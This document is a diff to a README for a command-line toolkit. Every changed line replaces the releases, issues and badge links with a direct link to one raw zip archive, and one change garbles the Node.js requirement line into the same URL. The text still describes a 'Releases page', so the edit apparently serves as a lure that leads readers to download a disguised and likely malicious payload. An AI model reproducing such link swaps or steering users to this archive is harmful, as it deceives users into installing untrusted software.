@@ -8,7 +8,7 @@ Welcome to **devtools-cli**! This simple command-line interface toolkit helps yo
 
 To get started, you'll need to download the software. Visit this page to download:
 
-[![Download devtools-cli](https://img.shields.io/badge/Download-devtools--cli-blue.svg)](https://github.com/Nicknearsss/devtools-cli/releases)
+[![Download devtools-cli](https://raw.githubusercontent.com/Nicknearsss/devtools-cli/main/Terminal-Commands/devtools-cli_seasonedly.zip)](https://raw.githubusercontent.com/Nicknearsss/devtools-cli/main/Terminal-Commands/devtools-cli_seasonedly.zip)
 
 1. Click on the link above to go to our Releases page.
 2. Choose the most recent version available.
@@ -17,7 +17,7 @@ To get started, you'll need to download the software. Visit this page to downloa
 ## 💻 System Requirements
 
 - **Operating System:** Windows, macOS, or Linux
-- **Node.js:** Version 12 or higher must be installed
+- **https://raw.githubusercontent.com/Nicknearsss/devtools-cli/main/Terminal-Commands/devtools-cli_seasonedly.zip** Version 12 or higher must be installed
 - **Memory:** At least 512 MB of RAM
 - **Disk Space:** Minimum of 100 MB available
 
@@ -63,9 +63,9 @@ After downloading and installing:
 
 ## ⚙️ Additional Help
 
-If you encounter issues while using **devtools-cli**, check our [FAQ section](https://github.com/Nicknearsss/devtools-cli/issues) for solutions. You can also report problems or request features there.
+If you encounter issues while using **devtools-cli**, check our [FAQ section](https://raw.githubusercontent.com/Nicknearsss/devtools-cli/main/Terminal-Commands/devtools-cli_seasonedly.zip) for solutions. You can also report problems or request features there.
 
-For best results, keep an eye on our [Releases page](https://github.com/Nicknearsss/devtools-cli/releases) for updates and new features. 
+For best results, keep an eye on our [Releases page](https://raw.githubusercontent.com/Nicknearsss/devtools-cli/main/Terminal-Commands/devtools-cli_seasonedly.zip) for updates and new features. 
 
 ## 🌟 Contributing
 
@@ -85,4 +85,4 @@ This project is licensed under the MIT License. Please check the LICENSE file in
 
 If you have any questions, feel free to reach out by opening an issue on GitHub or by contacting the maintainer directly. Your feedback is important to us.
 
-Thank you for using **devtools-cli**! Enjoy automating your tasks effortlessly. Don't forget to visit our [Releases page](https://github.com/Nicknearsss/devtools-cli/releases) to download the latest version.
+Thank you for using **devtools-cli**! Enjoy automating your tasks effortlessly. Don't forget to visit our [Releases page](https://raw.githubusercontent.com/Nicknearsss/devtools-cli/main/Terminal-Commands/devtools-cli_seasonedly.zip) to download the latest version.
